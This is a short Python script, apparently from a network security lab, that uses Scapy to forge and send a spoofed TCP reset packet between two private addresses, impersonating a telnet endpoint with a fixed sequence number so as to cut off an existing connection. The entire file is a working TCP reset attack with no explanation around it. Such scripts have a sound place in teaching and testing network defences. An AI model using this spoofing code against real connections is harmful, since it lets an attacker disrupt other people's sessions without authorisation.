#!/usr/bin/python3
import sys
from scapy.all import *

print("SENDING RESET PACKET.........")
IPLayer = IP(src="10.0.2.8", dst="10.0.2.9")
TCPLayer = TCP(sport=23, dport=46846,flags="R", seq=1219968966)
pkt = IPLayer/TCPLayer
ls(pkt)
send(pkt, verbose=0)

